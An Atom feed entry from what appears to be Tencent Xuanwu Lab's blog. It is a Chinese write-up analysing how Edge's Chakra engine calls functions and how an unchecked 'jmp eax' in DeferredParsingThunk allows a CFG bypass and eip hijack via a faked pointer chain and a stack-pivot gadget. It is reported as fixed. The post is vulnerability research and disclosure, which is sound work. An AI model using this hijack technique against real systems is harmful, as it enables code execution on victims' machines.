<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[xuanwulab]]></title>
  
  <link href="/cn/atom.xml" rel="self"/>
  <link href="http://xlab.tencent.com/cn/"/>
  <updated>2015-12-24T07:56:15.000Z</updated>
  <id>http://xlab.tencent.com/cn/</id>
  
  <author>
    <name><![CDATA[freener]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[再利用Chakra引擎绕过CFG]]></title>
    <link href="http://xlab.tencent.com/cn/2015/12/24/bypass-cfg-using-chakra-engine/"/>
    <id>http://xlab.tencent.com/cn/2015/12/24/bypass-cfg-using-chakra-engine/</id>
    <published>2015-12-24T07:32:26.000Z</published>
    <updated>2015-12-24T07:56:15.000Z</updated>
    <content type="html"><![CDATA[<p>本文源自一次与<a href="http://weibo.com/101174?from=feed&amp;loc=at&amp;nick=tombkeeper&amp;is_all=1" target="_blank" rel="external">TK</a>闲聊，期间得知成功绕过CFG的经过与细节(参考：<a href="http://xlab.tencent.com/cn/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/">利用Chakra JIT绕过DEP和CFG</a>)。随即出于对技术的兴趣，也抽出一些时间看了相关的东西，结果发现了另一处绕过CFG的位置。所以这篇文章中提到的思路与技术归根结底是来自<a href="http://weibo.com/101174?from=feed&amp;loc=at&amp;nick=tombkeeper&amp;is_all=1" target="_blank" rel="external">TK</a>提示的，在此特别感谢。</p>
<p>关于CFG的分析文章已经有很多了，想要了解的话可以参考我之前在HitCon 2015上的演讲(<a href="https://github.com/exp-sky/HitCon-2015-spartan-0day-exploit/blob/master/Spartan%200day%20%26%20Exploit-m.pdf" target="_blank" rel="external">spartan 0day &amp; exploit</a>)。要说明的是，本文的内容即为我演讲中马赛克的部分，至此通过一次内存写实现edge的任意代码执行方法就全部公开了。<br><a id="more"></a></p>
<h2 id="0x01_Chakra调用函数的逻辑">0x01 Chakra调用函数的逻辑</h2><p>chakra引擎在函数调用时，会根据所调用函数状态的不同进行不同的处理。比如第一次调用的函数、多次调用的函数、DOM接口函数及经过jit编译后的函数。不同的函数类型会有不同的处理流程，而这些不同的处理都会通过Js::InterpreterStackFrame::OP_CallCommon<js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0> &gt; &gt; &gt; 函数调用 Js::JavascriptFunction::CallFunction<1> 函数来实现。</1></js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0></p>
<h4 id="0x01_函数的首次调用与多次调用">0x01 函数的首次调用与多次调用</h4><p>当调用如下脚本时，Js::JavascriptFunction::CallFunction<1>函数会被Js::InterpreterStackFrame::OP_CallCommon<js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0> &gt; &gt; &gt;函数调用。</js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0></1></p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span><span class="comment">&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="title">test</span><span class="params">()</span>;</span></span><br></pre></td></tr></table></figure>
<p>如果函数是第一次被调用，则执行流程如下。</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:OP_CallCommon&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutDynamicProfile&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutT_CallI&lt;Js</span><span class="symbol">:</span><span class="symbol">:LayoutSizePolicy&lt;</span><span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:CallFunction&lt;</span><span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:DeferredParsingThunk</span></span><br><span class="line">			|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:DeferredParse</span></span><br><span class="line">			|-chakra!<span class="constant">NativeCodeGenerator:</span><span class="symbol">:CheckCodeGenThunk</span></span><br><span class="line">				|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:DelayDynamicInterpreterThunk</span></span><br><span class="line">					|-jmp_code</span><br><span class="line">						|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:InterpreterThunk</span></span><br></pre></td></tr></table></figure>
<p>如果再次调用这个函数的话，调用流程如下。</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:OP_CallCommon&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutDynamicProfile&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutT_CallI&lt;Js</span><span class="symbol">:</span><span class="symbol">:LayoutSizePolicy&lt;</span><span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:CallFunction&lt;</span><span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!<span class="constant">NativeCodeGenerator:</span><span class="symbol">:CheckCodeGenThunk</span></span><br><span class="line">			|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:DelayDynamicInterpreterThunk</span></span><br><span class="line">				|-jmp_code</span><br><span class="line">					|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:InterpreterThunk</span></span><br></pre></td></tr></table></figure>
<p>两次的调用流程大致是相同的，其中主要不同是因为，函数在第一次调用时候需要通过DeferredParsingThunk函数对其进行解析。其实函数只有在第一次调用时才进行进一步的初始化解析操作，这样设计主要是为了效率。而后续调用再直接解释执行。</p>
<p>分析发现，Js::JavascriptFunction::CallFunction<1>函数调用的子函数是通过Js::ScriptFunction对象中的数据获得的。后续调用的函数Js::JavascriptFunction::DeferredParsingThunk和NativeCodeGenerator::CheckCodeGenThunk都存在于Js::ScriptFunction对象中。两次调用中Js::ScriptFunction对象的变化。</1></p>
<p>第一次调用时的Js::ScriptFunction对象。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(06eaf050 )</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 06eaf050 </span><br><span class="line">06eaf050  <span class="number">5f695580</span> 06eaf<span class="number">080 00000</span><span class="number">000 00000</span>000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(06eaf050+4) </span><br><span class="line">06eaf080  <span class="number">00000012 00</span><span class="number">000000 06</span>e<span class="number">26c00 06e1</span>fea0</span><br><span class="line">06eaf090  5f8db<span class="number">3f0 00000</span>000 5fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(06eaf050+4)+0x10)</span><br><span class="line">chakra!Js<span class="number">::</span>JavascriptFunction<span class="number">::Defe</span>rredParsingThunk:</span><br></pre></td></tr></table></figure>
<p>第二次调用时的Js::ScriptFunction对象。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(06eaf050 )</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 06eaf050 </span><br><span class="line">06eaf050  <span class="number">5f695580</span> 1ce<span class="number">1a0c0 00</span><span class="number">000000 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(06eaf050+4)</span><br><span class="line">1ce1a0c0  <span class="number">00000012 00</span><span class="number">000000 06</span>e<span class="number">26c00 06e1</span>fea0</span><br><span class="line">1ce1a0d0  5f8db<span class="number">9e0 00000</span>000 5fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(06eaf050+4)+0x10)</span><br><span class="line">chakra!NativeCodeGenerator<span class="number">::C</span>heckCodeGenThunk:</span><br></pre></td></tr></table></figure>
<p>所以函数在第一次调用与后续调用的不同，是通过修改Js::ScriptFunction对象中的函数指针来实现的。</p>
<h4 id="0x02_函数的jit">0x02 函数的jit</h4><p>接下来我们看一下函数的jit。测试脚本代码如下，多次调用test1函数触发其jit。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">test1</span><span class="params">(num)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> num + <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发jit</span></span><br><span class="line"></span><br><span class="line">test1(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>经过jit的Js::ScriptFunction对象。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">//新的调试，对象内存地址会不同</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(<span class="number">07103050</span> )</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd <span class="number">07103050</span> </span><br><span class="line"><span class="number">07103050</span>  <span class="number">5f695580</span> <span class="number">1d7280c0</span> <span class="number">00000000 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(<span class="number">07103050+4</span>)</span><br><span class="line"><span class="number">1d7280c0</span>  <span class="number">00000012 00</span><span class="number">000000 07</span><span class="number">076c00 07</span>1080a0</span><br><span class="line"><span class="number">1d7280d0</span>  <span class="number">0a510600</span> <span class="number">00000000 5</span>fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(<span class="number">07103050+4</span>)+0x10)			    //jit code</span><br><span class="line"><span class="number">0a510600</span> 55              push    ebp</span><br><span class="line"><span class="number">0a510601</span> 8bec            mov     ebp,esp</span><br><span class="line"><span class="number">0a510603</span> 81fc5cc9d005    cmp     esp,5D0C95Ch</span><br><span class="line"><span class="number">0a510609</span> 7f21            jg      <span class="number">0a51062</span>c</span><br><span class="line"><span class="number">0a51060</span>b 6a00            push    0</span><br><span class="line"><span class="number">0a51060</span>d 6a00            push    0</span><br><span class="line"><span class="number">0a51060</span>f <span class="number">68d0121b04</span>      push    41B12D0h</span><br><span class="line"><span class="number">0a510614</span> <span class="number">685c09000</span>0      push    95Ch</span><br><span class="line"><span class="number">0a510619</span> e<span class="number">802955b55</span>      call    chakra!ThreadContext<span class="number">::</span>ProbeCurrentStack2 (5fac9b20)</span><br><span class="line"><span class="number">0a51061</span>e <span class="number">0f1f4000</span>        nop     dword ptr [eax]</span><br><span class="line"><span class="number">0a510622</span> <span class="number">0f1f4000</span>        nop     dword ptr [eax]</span><br><span class="line"><span class="number">0a510626</span> <span class="number">0f1f4000</span>        nop     dword ptr [eax]</span><br><span class="line"><span class="number">0a51062</span>a 6690            xchg    ax,ax</span><br><span class="line"><span class="number">0a51062</span>c 6a00            push    0</span><br><span class="line"><span class="number">0a51062</span>e 8d6424ec        lea     esp,[esp-14h]</span><br><span class="line"><span class="number">0a510632</span> 56              push    esi</span><br><span class="line"><span class="number">0a510633</span> 53              push    ebx</span><br><span class="line"><span class="number">0a510634</span> b<span class="number">8488e0607</span>      mov     eax,7068E48h</span><br><span class="line"><span class="number">0a510639</span> 8038ff          cmp     byte ptr [eax],0FFh</span><br><span class="line"><span class="number">0a51063</span>c 7402            je      <span class="number">0a510640</span></span><br><span class="line"><span class="number">0a51063</span>e fe00            inc     byte ptr [eax]</span><br><span class="line"><span class="number">0a510640</span> 8b450c          mov     eax,dword ptr [ebp+0Ch]</span><br><span class="line"><span class="number">0a510643</span> 25ffffff08      and     eax,8FFFFFFh</span><br><span class="line"><span class="number">0a510648</span> 0fbaf01b        btr     eax,1Bh</span><br><span class="line"><span class="number">0a51064</span>c 83d802          sbb     eax,2</span><br><span class="line"><span class="number">0a51064</span>f 7c2f            jl      <span class="number">0a510680</span></span><br><span class="line"><span class="number">0a510651</span> 8b5d14          mov     ebx,dword ptr [ebp+14h] //ebx = num</span><br><span class="line"><span class="number">0a510654</span> 8bc3            mov     eax,ebx		//eax = num (num &lt;&lt; 1 &amp; 1)</span><br><span class="line"><span class="number">0a510656</span> d1f8            sar     eax,1			//eax = num &gt;&gt; 1</span><br><span class="line"><span class="number">0a510658</span> 732f            jae     <span class="number">0a510689</span></span><br><span class="line"><span class="number">0a51065</span>a 8bf0            mov     esi,eax</span><br><span class="line"><span class="number">0a51065</span>c 8bc6            mov     eax,esi</span><br><span class="line"><span class="number">0a51065</span>e 40              inc     eax			//num + 1</span><br><span class="line"><span class="number">0a51065</span>f 7040            jo      <span class="number">0a5106a1</span></span><br><span class="line"><span class="number">0a510661</span> 8bc8            mov     ecx,eax</span><br><span class="line"><span class="number">0a510663</span> 83c102          add     ecx,2			//num + 2</span><br><span class="line"><span class="number">0a510666</span> 7045            jo      0a5106ad</span><br><span class="line"><span class="number">0a510668</span> 8bc1            mov     eax,ecx</span><br><span class="line"><span class="number">0a51066</span>a 83c003          add     eax,3			//num + 3</span><br><span class="line"><span class="number">0a51066</span>d 704a            jo      <span class="number">0a5106b9</span></span><br><span class="line"><span class="number">0a51066</span>f 8bc8            mov     ecx,eax</span><br><span class="line"><span class="number">0a510671</span> d1e1            shl     ecx,1			//ecx = num &lt;&lt; 1</span><br><span class="line"><span class="number">0a510673</span> 7050            jo      <span class="number">0a5106c5</span></span><br><span class="line"><span class="number">0a510675</span> 41              inc     ecx			//ecx = num += 1</span><br><span class="line"><span class="number">0a510676</span> 8bd9            mov     ebx,ecx</span><br><span class="line"><span class="number">0a510678</span> 8bc3            mov     eax,ebx</span><br><span class="line"><span class="number">0a51067</span>a 5b              pop     ebx</span><br><span class="line"><span class="number">0a51067</span>b 5e              pop     esi</span><br><span class="line"><span class="number">0a51067</span>c 8be5            mov     esp,ebp</span><br><span class="line"><span class="number">0a51067</span>e 5d              pop     ebp</span><br><span class="line"><span class="number">0a51067</span>f c3              ret</span><br></pre></td></tr></table></figure>
<p>Js::ScriptFunction对象中原本指向NativeCodeGenerator::CheckCodeGenThunk函数的指针，在jit之后变为指向jit code的指针。实现了直接调用函数jit code。</p>
<p>这里简单说明一下，在调用函数传递参数时，是先将参数左移一位，然后将最低位置1之后的值进行传递的（parameter = (num &lt;&lt; 1) &amp; 1）。所以其在获取参数之后的第一件事是将其右移1位，获取参数原始的值。至于为什么要这样，我想应该是因为脚本引擎垃圾回收机制导致的，引擎通过最低位来区分对象与数据。</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:OP_CallCommon&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutDynamicProfile&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutT_CallI&lt;Js</span><span class="symbol">:</span><span class="symbol">:LayoutSizePolicy&lt;</span><span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:CallFunction&lt;</span><span class="number">1</span>&gt;</span><br><span class="line">		|-jit code</span><br></pre></td></tr></table></figure>
<p>调用jit函数时的调用栈如上所示，这就是chakra引擎调用jit函数的方法。</p>
<h4 id="0x03_DOM接口函数">0x03 DOM接口函数</h4><p>最后为了完整性，还有一类函数需要简单介绍一下，就是DOM接口函数，由其它引擎如渲染引擎提供的函数（理论上可以为任何其它引擎）。</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br></pre></td></tr></table></figure>
<p>执行上面脚本则会通过下面的函数调用流程，最后调用到提供接口函数的引擎中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chakra!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;<span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!Js::JavascriptFunction::CallFunction&lt;<span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk <span class="comment">//调用dom接口函数</span></span><br><span class="line">			|-dom_interface_function	<span class="comment">//EDGEHTML!CFastDOM::CDocument::Trampoline_createElement</span></span><br></pre></td></tr></table></figure>
<p>当调用dom接口函数时，Js::InterpreterStackFrame::OP_CallCommon<js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0> &gt; &gt; &gt;函数及后续的处理流程中所使用的Function对象与前面不同，使用的是Js::JavascriptExternalFunction对象。然后与前面的函数调用类似，也是通过解析对象内的函数指针，并对其进行调用，最终进入到想要调用的DOM接口函数中。</js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0></p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(06f2cea0)</span><br><span class="line">chakra!Js<span class="number">::</span>JavascriptExternalFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 06f2cea0 </span><br><span class="line">06f2cea0  <span class="number">5f696c4</span>c <span class="number">06e6f7a0</span> <span class="number">00000000 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(06f2cea0+4)</span><br><span class="line"><span class="number">06e6f7a0</span>  <span class="number">00000012 00</span><span class="number">000000 06</span>e<span class="number">76c00 06f04</span>0a0</span><br><span class="line"><span class="number">06e6f7b0</span>  <span class="number">5f8c6130</span> <span class="number">00000000 5</span>fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(06f2cea0+4)+0x10)</span><br><span class="line">chakra!Js<span class="number">::</span>JavascriptExternalFunction<span class="number">::E</span>xternalFunctionThunk:</span><br></pre></td></tr></table></figure>
<p>这就是chakra引擎对不同类型函数的不同调用的方式。</p>
<h2 id="0x02_漏洞与利用">0x02 漏洞与利用</h2><p>经过前面对chakra引擎各种调用函数方法的介绍，我们再来看一下本文的重点绕过cfg的漏洞。前面提到的在第一次调用脚本创建的函数时与后续调用此函数会有不同的流程。这里我们再看一下此处的逻辑，调用栈如下。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">chakra!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;<span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!Js::JavascriptFunction::CallFunction&lt;<span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!Js::JavascriptFunction::DeferredParsingThunk</span><br><span class="line">			|-chakra!Js::JavascriptFunction::DeferredParse    <span class="comment">//获取NativeCodeGenerator::CheckCodeGenThunk函数</span></span><br><span class="line">			|-chakra!NativeCodeGenerator::CheckCodeGenThunk</span><br><span class="line">				|-chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk</span><br><span class="line">					|-jmp_code	</span><br><span class="line">						|-chakra!Js::InterpreterStackFrame::InterpreterThunk</span><br></pre></td></tr></table></figure>
<p>在前面没有提到的是，上面调用流程中的Js::JavascriptFunction::DeferredParse函数。此函数内部会进行函数解析相关的工作，并且返回NativeCodeGenerator::CheckCodeGenThunk函数的指针，然后在返回Js::JavascriptFunction::DeferredParsingThunk函数后对其进行调用。NativeCodeGenerator::CheckCodeGenThunk函数的指针也是通过解析Js::JavascriptFunction对象获得的。代码如下。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl Js::JavascriptFunction::DeferredParsingThunk(<span class="keyword">struct</span> Js::ScriptFunction *p_script_function)</span><br><span class="line">&#123;</span><br><span class="line">  NativeCodeGenerator_CheckCodeGenThunk = Js::JavascriptFunction::DeferredParse(&amp;p_script_function);</span><br><span class="line">  <span class="keyword">return</span> NativeCodeGenerator_CheckCodeGenThunk();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F0</span> <span class="tag">push</span>    <span class="tag">ebp</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F1</span> <span class="tag">mov</span>     <span class="tag">ebp</span>, <span class="tag">esp</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F3</span> <span class="tag">lea</span>     <span class="tag">eax</span>, <span class="attr_selector">[esp+p_script_function]</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F7</span> <span class="tag">push</span>    <span class="tag">eax</span>             ; <span class="tag">struct</span> <span class="tag">Js</span><span class="pseudo">::ScriptFunction</span> **</span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F8</span> <span class="tag">call</span>    <span class="tag">Js</span><span class="pseudo">::JavascriptFunction</span><span class="pseudo">::DeferredParse</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3FD</span> <span class="tag">pop</span>     <span class="tag">ebp</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3FE</span> <span class="tag">jmp</span>     <span class="tag">eax</span></span><br></pre></td></tr></table></figure>
<p>在这个跳转位置上并没有对eax中的函数指针进行CFG检查。所以可以利用其进行eip劫持。不过还首先还要知道Js::JavascriptFunction::DeferredParse函数返回的NativeCodeGenerator::CheckCodeGenThunk函数指针是如何通过Js::ScriptFunction对象何解析出来的。解析过程如下。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(070af050)</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 070af050 + 14</span><br><span class="line">070af064  <span class="number">076690e0</span> 5fb11ef<span class="number">4 00000000</span> <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">0:010&gt; dd <span class="number">076690e0</span> + 10</span><br><span class="line"><span class="number">076690f0</span>  <span class="number">076690e0</span> <span class="number">04186628 07</span><span class="number">065f90 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd <span class="number">076690e0</span> + 28</span><br><span class="line"><span class="number">07669108</span>  07010dc<span class="number">0 000001</span>a<span class="number">8 00000035</span> <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">0:010&gt; dd 07010dc0 </span><br><span class="line">07010dc0  <span class="number">5f696000</span> <span class="number">05a452b8</span> <span class="number">00000000 5</span>f8db9e0</span><br><span class="line"></span><br><span class="line">0:010&gt; u 5f8db9e0</span><br><span class="line">chakra!NativeCodeGenerator<span class="number">::C</span>heckCodeGenThunk:</span><br></pre></td></tr></table></figure>
<p>如上所述，Js::JavascriptFunction::DeferredParse通过解析Js::ScriptFunction对象获取NativeCodeGenerator::CheckCodeGenThunk函数指针，解析方法简写为[[[Js::ScriptFunction+14]+10]+28]+0c。所以只要伪造此处内存中的数据，即可通过调用函数来间接触发Js::JavascriptFunction::DeferredParse函数的调用，进而劫持eip，具体如下。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="literal">eax</span>=603ba064 <span class="literal">ebx</span>=063fba10 <span class="literal">ecx</span>=063fba40 <span class="literal">edx</span>=063fba40 <span class="literal">esi</span>=<span class="number">00000001</span> <span class="literal">edi</span>=058fc6b0</span><br><span class="line"><span class="literal">eip</span>=603ba064 <span class="literal">esp</span>=058fc414 <span class="literal">ebp</span>=058fc454 iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei ng nz na po cy</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">chakra!<span class="string">`dynamic initializer for 'DOMFastPathInfo::getterTable''+0x734:</span><br><span class="line">603ba064 94              xchg    eax,esp</span><br><span class="line">603ba065 c3              ret</span></span><br></pre></td></tr></table></figure>
<p>这样就绕过了cfg，成功劫持了eip。这种方法简单稳定，在获得了内存读写能力时使用是很方便的。此漏洞已于2015年7月25日报告微软。</p>
<h2 id="0x03_修补方案">0x03 修补方案</h2><p>本文所述的漏洞微软已经修补，修补方案也比较简单就是对此处跳转增加cfg检查。</p>
